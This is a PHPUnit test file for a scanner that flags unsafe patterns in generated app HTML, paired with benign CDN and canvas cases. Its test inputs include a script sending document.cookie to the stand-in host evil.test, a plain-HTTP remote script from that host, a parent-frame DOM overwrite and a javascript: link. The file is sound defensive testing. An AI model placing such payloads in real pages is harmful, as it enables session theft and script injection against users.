<?php

namespace Modules\Moabom\Apps\Tests\Unit;

use Modules\Moabom\Apps\Support\GeneratedAppHtmlSecurityScanner;
use PHPUnit\Framework\TestCase;

class GeneratedAppHtmlSecurityScannerTest extends TestCase
{
    private GeneratedAppHtmlSecurityScanner $scanner;

    protected function setUp(): void
    {
        parent::setUp();
        $this->scanner = new GeneratedAppHtmlSecurityScanner;
    }

    public function test_allows_three_js_cdn_and_canvas_game_logic(): void
    {
        $html = <<<'HTML'
<!DOCTYPE html><html><head>
<script src="https://cdn.jsdelivr.net/npm/three@0.160.0/build/three.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.0/chart.umd.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/phaser@3.70.0/dist/phaser.min.js"></script>
</head><body>
<canvas id="game"></canvas>
<script>
const scene = new THREE.Scene();
function loop() { requestAnimationFrame(loop); }
loop();
</script>
</body></html>
HTML;

        $this->assertTrue($this->scanner->scan($html)->isClean());
    }

    public function test_blocks_parent_shell_escape(): void
    {
        $html = '<!DOCTYPE html><html><head></head><body><script>parent.document.body.innerHTML="x"</script></body></html>';

        $result = $this->scanner->scan($html);

        $this->assertFalse($result->isClean());
        $this->assertContains('parent_shell_escape', $result->ruleIds());
    }

    public function test_blocks_cookie_exfiltration(): void
    {
        $html = '<html><body><script>fetch("https://evil.test/?c="+document.cookie)</script></body></html>';

        $result = $this->scanner->scan($html);

        $this->assertContains('cookie_exfiltration', $result->ruleIds());
    }

    public function test_blocks_insecure_remote_script_url(): void
    {
        $html = '<html><head><script src="http://evil.test/m.js"></script></head><body></body></html>';

        $result = $this->scanner->scan($html);

        $this->assertContains('insecure_remote_script', $result->ruleIds());
    }

    public function test_allows_https_remote_script_url(): void
    {
        $html = '<html><head><script src="https://cdn.jsdelivr.net/npm/phaser@3.70.0/dist/phaser.min.js"></script></head><body></body></html>';

        $this->assertTrue($this->scanner->scan($html)->isClean());
    }

    public function test_blocks_javascript_protocol_in_anchor(): void
    {
        $html = '<html><body><a href="javascript:alert(1)">x</a></body></html>';

        $this->assertContains('javascript_protocol', $this->scanner->scan($html)->ruleIds());
    }

    public function test_plain_text_mention_of_parent_document_does_not_block(): void
    {
        $html = '<html><body><p>Do not use parent.document in tutorials.</p></body></html>';

        $this->assertTrue($this->scanner->scan($html)->isClean());
    }
}
